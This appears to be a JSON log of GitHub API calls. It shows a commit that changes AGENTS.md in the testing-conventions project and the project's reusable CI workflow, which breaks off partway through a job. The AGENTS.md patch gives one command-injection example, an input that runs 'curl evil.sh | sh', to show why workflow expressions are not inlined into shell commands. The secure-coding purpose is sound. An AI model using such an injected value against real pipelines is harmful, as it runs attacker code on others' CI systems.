+      "html_url": "https://github.com/thekevinscott/testing-conventions/commit/b3d3556b377c69f594826502c524966f9b0c6f60",
+      "comments_url": "https://api.github.com/repos/thekevinscott/testing-conventions/commits/b3d3556b377c69f594826502c524966f9b0c6f60/comments",
+      "author": {
+        "login": "thekevinscott",
+        "id": 151596,
+        "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+        "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinscott",
+        "html_url": "https://github.com/thekevinscott",
+        "followers_url": "https://api.github.com/users/thekevinscott/followers",
+        "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+        "repos_url": "https://api.github.com/users/thekevinscott/repos",
+        "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "committer": {
+        "login": "web-flow",
+        "id": 19864447,
+        "node_id": "MDQ6VXNlcjE5ODY0NDQ3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/19864447?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/web-flow",
+        "html_url": "https://github.com/web-flow",
+        "followers_url": "https://api.github.com/users/web-flow/followers",
+        "following_url": "https://api.github.com/users/web-flow/following{/other_user}",
+        "gists_url": "https://api.github.com/users/web-flow/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/web-flow/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/web-flow/subscriptions",
+        "organizations_url": "https://api.github.com/users/web-flow/orgs",
+        "repos_url": "https://api.github.com/users/web-flow/repos",
+        "events_url": "https://api.github.com/users/web-flow/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/web-flow/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "parents": [
+        {
+          "sha": "c924613b5f2bbceec1a246f37cca33b04008ec16",
+          "url": "https://api.github.com/repos/thekevinscott/testing-conventions/commits/c924613b5f2bbceec1a246f37cca33b04008ec16",
+          "html_url": "https://github.com/thekevinscott/testing-conventions/commit/c924613b5f2bbceec1a246f37cca33b04008ec16"
+        },
+        {
+          "sha": "f2ba71f73662dfee5dd5b65fa9e74067bd1f19b5",
+          "url": "https://api.github.com/repos/thekevinscott/testing-conventions/commits/f2ba71f73662dfee5dd5b65fa9e74067bd1f19b5",
+          "html_url": "https://github.com/thekevinscott/testing-conventions/commit/f2ba71f73662dfee5dd5b65fa9e74067bd1f19b5"
+        }
+      ],
+      "stats": {
+        "total": 25,
+        "additions": 22,
+        "deletions": 3
+      },
+      "files": [
+        {
+          "sha": "e87d017154fc293cee7e4127e41f7eaa36ae4f40",
+          "filename": "AGENTS.md",
+          "status": "modified",
+          "additions": 22,
+          "deletions": 3,
+          "changes": 25,
+          "blob_url": "https://github.com/thekevinscott/testing-conventions/blob/b3d3556b377c69f594826502c524966f9b0c6f60/AGENTS.md",
+          "raw_url": "https://github.com/thekevinscott/testing-conventions/raw/b3d3556b377c69f594826502c524966f9b0c6f60/AGENTS.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/testing-conventions/contents/AGENTS.md?ref=b3d3556b377c69f594826502c524966f9b0c6f60",
+          "patch": "@@ -283,9 +283,28 @@ Two reasons this is a requirement, not a preference:\n   extracting to a script sidesteps the whole class (#301, #302).\n \n Follow the `internals/move-major-tag` (`src/move_major_tag.py` + colocated unit test + `tests/`)\n-and `check_e2e_verify_wired` precedents for structure. Passing a value from a step to a script is\n-a CLI argument (`… check.py \"${{ steps.detect.outputs.package_root }}\"`), never an env\n-side-channel — see **Never pass data through the environment**.\n+and `check_e2e_verify_wired` precedents for structure.\n+\n+**A value a step hands a script arrives as a CLI argument, never read from the environment by the\n+script itself.** Never inline `${{ }}` into the invocation: GitHub substitutes that text before bash\n+parses it, so a `workflow_dispatch` input of `a\"; curl evil.sh | sh; \"` executes. Bind the\n+expression to a step `env:` name, then pass that as a quoted shell variable in the argument list:\n+\n+```yaml\n+env:\n+  PACKAGES: ${{ inputs.packages }}\n+run: pnpm run bootstrap-npm -- \"$PACKAGES\"\n+```\n+\n+That `env:` name is bash's, not the script's. It exists only to carry the value across the templating\n+layer, and bash expands it after parsing, as one argv element. The script reads `process.argv` /\n+`sys.argv` and never `process.env` / `os.environ` for its own inputs — that read is the side-channel\n+**Never pass data through the environment** forbids, and a step `env:` block is not an exemption\n+from it.\n+\n+The exception is a variable some *other* tool reads from the environment as its own documented\n+interface: `NODE_AUTH_TOKEN` for `npm publish`, `CI`, `PATH`. Those are that tool's contract, not our\n+step-to-script wiring, and they stay in `env:`.\n \n ## Wiring gates are earned\n "
+        }
+      ]
+    }
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "testing-conventions",
+      "path": ".github/workflows/testing-conventions.yml",
+      "ref": "b3d3556b377c69f594826502c524966f9b0c6f60"
+    },
+    "result": "name: Testing Conventions\n\n# Reusable, consumer-facing workflow: one `uses:` call runs every check.\n# See docs/reference/workflow.md for the inputs, the checks, and the `@v0` contract.\n\non:\n  workflow_call:\n    inputs:\n      languages:\n        description: 'Optional JSON array restricting which languages to check, e.g. [\"python\"]. Empty (the default) auto-detects every supported language present under `source`.'\n        type: string\n        default: ''\n      source:\n        description: 'Directory scanned recursively for sources.'\n        type: string\n        default: 'src'\n      version:\n        description: 'testing-conventions version to run, e.g. 0.1.0 (default: latest from npm).'\n        type: string\n        default: ''\n      config:\n        description: 'Optional config file to refine the checks (coverage thresholds, exemptions). If absent, every check runs with sane defaults.'\n        type: string\n        default: 'testing-conventions.toml'\n      base:\n        description: 'Base ref for the diff-scoped `--base` jobs, diffed as `<base>...HEAD`. Used by the `*-changed` jobs, which run on `pull_request` only and check out full history.'\n        type: string\n        default: 'origin/main'\n      run_e2e:\n        description: 'Force the `e2e verify` freshness gate on. It is already default-on when committed receipts (`e2e-attestations/`) are present at the package root; set this to run it regardless. Needs the receipts and full git history.'\n        type: boolean\n        default: false\n      packaging_artifact:\n        description: 'Name of an uploaded build artifact (actions/upload-artifact) holding the built distributions (.whl/.tar.gz/.tgz/.crate) to check. When set, the packaging job downloads and inspects it. When empty (default), packaging still runs over a conventional dist/ found in the checkout, and is skipped only when no dist/ exists either.'\n        type: string\n        default: ''\n      gates:\n        description: 'Optional JSON array naming which gates run, e.g. [\"colocated-test\", \"unit-lint\", \"integration-lint\"]. Empty (the default) runs every applicable gate. Gate names: colocated-test, one-function-per-file, unit-lint, unit-coverage, mutation, integration-lint, packaging, e2e-verify, changelog. A named gate still applies its own conditions, and its diff-scoped variant rides with it (colocated-test covers the co-change job, unit-coverage the changed-line job). The allowlist is authoritative: a gate left out is skipped even when run_e2e / packaging_artifact is set.'\n        type: string\n        default: ''\n      rust_toolchain:\n        description: 'Manual override: provision a stable Rust toolchain (with a cargo registry + target cache) in the suite-executing jobs, before build_command runs. unit coverage / changed-line coverage / unit mutation already auto-provision it when the manifest at the derived package root declares a Rust-compiling build (a Cargo.toml, a maturin backend, a napi key); set this by hand only for a build the manifest does not express. The rust matrix arm always carries its own toolchain. false (the default) leaves provisioning to that auto-derivation.'\n        type: boolean\n        default: false\n\npermissions:\n  contents: read\n\njobs:\n  detect:\n    name: Detect requested languages with sources\n    runs-on: ubuntu-latest\n    outputs:\n      languages: ${{ steps.scan_hermetic.outputs.languages || steps.scan_published.outputs.languages }}\n      colocated_test_languages: ${{ steps.scan_hermetic.outputs.colocated_test_languages || steps.scan_published.outputs.colocated_test_languages }}\n      integration_lint_languages: ${{ steps.scan_hermetic.outputs.integration_lint_languages || steps.scan_published.outputs.integration_lint_languages }}\n      isolation_languages: ${{ steps.scan_hermetic.outputs.isolation_languages || steps.scan_published.outputs.isolation_languages }}\n      static_languages: ${{ steps.scan_hermetic.outputs.static_languages || steps.scan_published.outputs.static_languages }}\n      one_function_languages: ${{ steps.scan_hermetic.outputs.one_function_languages || steps.scan_published.outputs.one_function_languages }}\n      coverage_languages: ${{ steps.scan_hermetic.outputs.coverage_languages || steps.scan_published.outputs.coverage_languages }}\n      mutation_languages: ${{ steps.scan_hermetic.outputs.mutation_languages || steps.scan_published.outputs.mutation_languages }}\n      packaging_dist: ${{ steps.scan_hermetic.outputs.packaging_dist || steps.scan_published.outputs.packaging_dist }}\n      e2e_attestation: ${{ steps.scan_hermetic.outputs.e2e_attestation || steps.scan_published.outputs.e2e_attestation }}\n      package_root: ${{ steps.scan_hermetic.outputs.package_root || steps.scan_published.outputs.package_root }}\n      ts_package_manager: ${{ steps.scan_hermetic.outputs.ts_package_manager || steps.scan_published.outputs.ts_package_manager }}\n      ts_pnpm_version: ${{ steps.scan_hermetic.outputs.ts_pnpm_version || steps.scan_published.outputs.ts_pnpm_version }}\n      python_env: ${{ steps.scan_hermetic.outputs.python_env || steps.scan_published.outputs.python_env }}\n      provision_rust: ${{ steps.scan_hermetic.outputs.provision_rust || steps.scan_published.outputs.provision_rust }}\n      cargo_target_dir: ${{ steps.scan_hermetic.outputs.cargo_target_dir || steps.scan_published.outputs.cargo_target_dir }}\n      config: ${{ steps.scan_hermetic.outputs.config || steps.scan_published.outputs.config }}\n      build_command: ${{ steps.scan_hermetic.outputs.build_command || steps.scan_published.outputs.build_command }}\n      packaging_build: ${{ steps.scan_hermetic.outputs.packaging_build || steps.scan_published.outputs.packaging_build }}\n      packaging_language: ${{ steps.scan_hermetic.outputs.packaging_language || steps.scan_published.outputs.packaging_language }}\n      e2e_extra_scope: ${{ steps.scan_hermetic.outputs.e2e_extra_scope || steps.scan_published.outputs.e2e_extra_scope }}\n      e2e_exclude: ${{ steps.scan_hermetic.outputs.e2e_exclude || steps.scan_published.outputs.e2e_exclude }}\n      cli_command: ${{ steps.scan_hermetic.outputs.cli_command || steps.scan_published.outputs.cli_command }}\n      ts_mutation_adapter_args: ${{ steps.scan_hermetic.outputs.ts_mutation_adapter_args || steps.scan_published.outputs.ts_mutation_adapter_args }}\n    steps:\n      - uses: actions/checkout@v6\n      - id: scan_hermetic\n        # `uses:` cannot be dynamic, so the HEAD and published detect actions are separate steps.\n        if: ${{ github.repository == 'thekevinscott/testing-conventions' && inputs.version == '' }}\n        uses: ./.github/actions/detect\n        with:\n          languages: ${{ inputs.languages }}\n          path: ${{ inputs.source }}\n          config: ${{ inputs.config }}\n          caller_repository: ${{ github.repository }}\n          version: ${{ inputs.version }}\n      - id: scan_published\n        if: ${{ !(github.repository == 'thekevinscott/testing-conventions' && inputs.version == '') }}\n        uses: thekevinscott/testing-conventions/.github/actions/detect@v0\n        with:\n          languages: ${{ inputs.languages }}\n          path: ${{ inputs.source }}\n          config: ${{ inputs.config }}\n          caller_repository: ${{ github.repository }}\n          version: ${{ inputs.version }}\n\n  changelog:\n    name: CHANGELOG + MIGRATIONS touched\n    needs: detect\n    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"changelog\"')) }}\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          fetch-depth: 0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      - name: Check changelog and migration fragments\n        env:\n          BASE: ${{ inputs.base }}\n          VERSION: ${{ inputs.version }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} changelog --base \"$BASE\"\n\n  static:\n    name: Static checks (${{ matrix.language }})\n    needs: detect\n    if: ${{ (inputs.gates == '' || contains(inputs.gates, '\"colocated-test\"') || contains(inputs.gates, '\"unit-lint\"') || contains(inputs.gates, '\"one-function-per-file\"') || contains(inputs.gates, '\"integration-lint\"')) && (needs.detect.outputs.static_languages || needs.detect.outputs.integration_lint_languages) != '[]' }}\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ${{ fromJSON(needs.detect.outputs.static_languages || needs.detect.outputs.integration_lint_languages) }}\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # The fetch-depth values are quoted: a bare 0 is falsy, so `&& 0 || 1` would always yield 1.\n          fetch-depth: ${{ github.event_name == 'pull_request' && '0' || '1' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      - name: Check colocated test\n        if: ${{ (inputs.gates == '' || contains(inputs.gates, '\"colocated-test\"')) && contains(needs.detect.outputs.colocated_test_languages || needs.detect.outputs.languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit colocated-test --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n      - name: Check co-change vs ${{ inputs.base }}\n        # `!cancelled()`: an earlier gate's failure must not hide this gate's result.\n        if: ${{ !cancelled() && github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"colocated-test\"')) && contains(needs.detect.outputs.languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          BASE: ${{ inputs.base }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit colocated-test --language \"$LANGUAGE\" --base \"$BASE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n      - name: Check unit lint\n        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '\"unit-lint\"')) && contains(needs.detect.outputs.isolation_languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit lint --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n      - name: Check one function per file\n        # The `|| integration_lint_languages` fallback covers a stale `@v0` detect that predates\n        # `one_function_languages`; the two sets are identical.\n        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '\"one-function-per-file\"')) && contains(needs.detect.outputs.one_function_languages || needs.detect.outputs.integration_lint_languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit one-function-per-file --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n      - name: Lint integration tests\n        if: ${{ !cancelled() && (inputs.gates == '' || contains(inputs.gates, '\"integration-lint\"')) && contains(needs.detect.outputs.integration_lint_languages, format('\"{0}\"', matrix.language)) }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} integration lint --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n\n  unit-coverage:\n    name: Unit-test coverage (${{ matrix.language }})\n    needs: detect\n    if: ${{ (inputs.gates == '' || contains(inputs.gates, '\"unit-coverage\"')) && needs.detect.outputs.coverage_languages != '[]' }}\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ${{ fromJSON(needs.detect.outputs.coverage_languages) }}\n    steps:\n      - uses: actions/checkout@v6\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      # cargo must be on PATH first: `uv sync` or an npm `prepare` may itself compile a Rust core.\n      - if: matrix.language == 'rust'\n        uses: dtolnay/rust-toolchain@stable\n        with:\n          components: llvm-tools-preview\n      - if: matrix.language == 'rust'\n        name: Install cargo-llvm-cov\n        uses: taiki-e/install-action@v2\n        with:\n          tool: cargo-llvm-cov\n      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'\n        uses: dtolnay/rust-toolchain@stable\n      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'\n        name: Cache the Rust build (cargo registry + target)\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}\n          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}\n          restore-keys: |\n            rust-toolchain-build-${{ runner.os }}-\n      - if: matrix.language == 'python'\n        uses: astral-sh/setup-uv@v7\n        with:\n          enable-cache: true\n      - if: matrix.language == 'python'\n        name: Provision the Python suite environment (uv)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PYTHON_ENV\" = \"uv\" ]; then uv sync; else uv venv; fi\n          if compgen -G \"$GITHUB_WORKSPACE/hermetic-cli/*.whl\" > /dev/null; then uv pip install pytest \"$GITHUB_WORKSPACE\"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi\n          echo \"$PWD/.venv/bin\" >> \"$GITHUB_PATH\"\n      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'\n        uses: pnpm/action-setup@v5\n        with:\n          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - if: matrix.language == 'typescript'\n        name: Install project dependencies\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PM\" = \"pnpm\" ]; then pnpm install --frozen-lockfile; else npm ci; fi\n      # The command is passed through env and `eval`-ed, so a full shell string works and no\n      # caller value is interpolated into `run:`.\n      - if: needs.detect.outputs.build_command != ''\n        name: Run the build step (build_command)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}\n        run: |\n          set -euo pipefail\n          eval \"$BUILD_COMMAND\"\n      - name: Check unit-test coverage\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit coverage --language \"$LANGUAGE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n\n  coverage-changed:\n    name: Unit-test coverage — changed lines (${{ matrix.language }})\n    needs: detect\n    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"unit-coverage\"')) && needs.detect.outputs.coverage_languages != '[]' }}\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ${{ fromJSON(needs.detect.outputs.coverage_languages) }}\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # `--base` diffs `<base>...HEAD`, so the base ref must be reachable.\n          fetch-depth: 0\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      # cargo must be on PATH first: `uv sync` or an npm `prepare` may itself compile a Rust core.\n      - if: matrix.language == 'rust'\n        uses: dtolnay/rust-toolchain@stable\n        with:\n          components: llvm-tools-preview\n      - if: matrix.language == 'rust'\n        name: Install cargo-llvm-cov\n        uses: taiki-e/install-action@v2\n        with:\n          tool: cargo-llvm-cov\n      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'\n        uses: dtolnay/rust-toolchain@stable\n      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'\n        name: Cache the Rust build (cargo registry + target)\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}\n          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}\n          restore-keys: |\n            rust-toolchain-build-${{ runner.os }}-\n      - if: matrix.language == 'python'\n        uses: astral-sh/setup-uv@v7\n        with:\n          enable-cache: true\n      - if: matrix.language == 'python'\n        name: Provision the Python suite environment (uv)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PYTHON_ENV\" = \"uv\" ]; then uv sync; else uv venv; fi\n          if compgen -G \"$GITHUB_WORKSPACE/hermetic-cli/*.whl\" > /dev/null; then uv pip install pytest \"$GITHUB_WORKSPACE\"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi\n          echo \"$PWD/.venv/bin\" >> \"$GITHUB_PATH\"\n      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'\n        uses: pnpm/action-setup@v5\n        with:\n          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - if: matrix.language == 'typescript'\n        name: Install project dependencies\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PM\" = \"pnpm\" ]; then pnpm install --frozen-lockfile; else npm ci; fi\n      - if: needs.detect.outputs.build_command != ''\n        name: Run the build step (build_command)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}\n        run: |\n          set -euo pipefail\n          eval \"$BUILD_COMMAND\"\n      - name: Check changed-line coverage vs ${{ inputs.base }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          BASE: ${{ inputs.base }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit coverage --language \"$LANGUAGE\" --base \"$BASE\" --config \"$CONFIG\" \"$SCAN_PATH\"\n\n  mutation:\n    name: Unit mutation — changed lines (${{ matrix.language }})\n    needs: detect\n    # `mutation_languages` is a newer detect output, so the matrix falls back to\n    # `coverage_languages` (the identical set) until `@v0` advances to a detect that emits it.\n    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"mutation\"')) && (needs.detect.outputs.mutation_languages || needs.detect.outputs.coverage_languages) != '[]' }}\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ${{ fromJSON(needs.detect.outputs.mutation_languages || needs.detect.outputs.coverage_languages) }}\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # `--base` diffs `<base>...HEAD`, so the base ref must be reachable.\n          fetch-depth: 0\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      # cargo must be on PATH first: a maturin/PyO3 build triggered by `uv sync` needs it.\n      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'\n        uses: dtolnay/rust-toolchain@stable\n      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'\n        name: Cache the Rust build (cargo registry + target)\n        uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}\n          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}\n          restore-keys: |\n            rust-toolchain-build-${{ runner.os }}-\n      - if: matrix.language == 'python'\n        uses: astral-sh/setup-uv@v7\n        with:\n          enable-cache: true\n      - if: matrix.language == 'python'\n        name: Provision the Python suite environment (uv)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PYTHON_ENV\" = \"uv\" ]; then uv sync; else uv venv; fi\n          if compgen -G \"$GITHUB_WORKSPACE/hermetic-cli/*.whl\" > /dev/null; then uv pip install pytest \"$GITHUB_WORKSPACE\"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi\n          echo \"$PWD/.venv/bin\" >> \"$GITHUB_PATH\"\n      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'\n        uses: pnpm/action-setup@v5\n        with:\n          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - if: matrix.language == 'typescript'\n        name: Install project dependencies\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PM\" = \"pnpm\" ]; then pnpm install --frozen-lockfile; else npm ci; fi\n      # The CLI installs cargo-mutants itself on first use; caching that dir reuses the build.\n      - if: matrix.language == 'rust'\n        uses: dtolnay/rust-toolchain@stable\n      - if: matrix.language == 'rust'\n        name: Cache the provisioned cargo-mutants\n        uses: actions/cache@v4\n        with:\n          path: ~/.cache/testing-conventions\n          key: cargo-mutants-provision-${{ runner.os }}\n      - if: needs.detect.outputs.build_command != ''\n        name: Run the build step (build_command)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}\n        run: |\n          set -euo pipefail\n          eval \"$BUILD_COMMAND\"\n      - name: Check mutation on the lines changed vs ${{ inputs.base }}\n        env:\n          LANGUAGE: ${{ matrix.language }}\n          SCAN_PATH: ${{ inputs.source }}\n          VERSION: ${{ inputs.version }}\n          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}\n          BASE: ${{ inputs.base }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n          # `$TS_MUTATION_ADAPTER_ARGS` is deliberately unquoted: empty on the published path,\n          # word-split into flag and path on the hermetic one.\n          TS_MUTATION_ADAPTER_ARGS: ${{ needs.detect.outputs.ts_mutation_adapter_args }}\n        run: ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} unit mutation --language \"$LANGUAGE\" --base \"$BASE\" --config \"$CONFIG\" \"$SCAN_PATH\" $TS_MUTATION_ADAPTER_ARGS\n\n  e2e-verify:\n    name: E2E attestation freshness (e2e verify)\n    needs: detect\n    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '\"e2e-verify\"')) && (inputs.run_e2e || needs.detect.outputs.e2e_attestation == 'true') }}\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # `--base` diffs `<base>..HEAD`, so full history is needed and `inputs.base` must resolve.\n          # Check out the PR's head commit, not the ephemeral merge commit, which an attestation\n          # can never name — it is rebuilt on every push.\n          fetch-depth: 0\n          ref: ${{ github.event.pull_request.head.sha }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - name: Download the CLI built from HEAD (hermetic)\n        if: needs.detect.outputs.cli_command != ''\n        uses: ./.github/actions/download-hermetic-cli\n      - name: Verify the e2e attestation is current\n        env:\n          VERSION: ${{ inputs.version }}\n          PACKAGE_ROOT: ${{ needs.detect.outputs.package_root }}\n          SCAN_PATH: ${{ inputs.source }}\n          BASE: ${{ inputs.base }}\n          EXTRA_SCOPE: 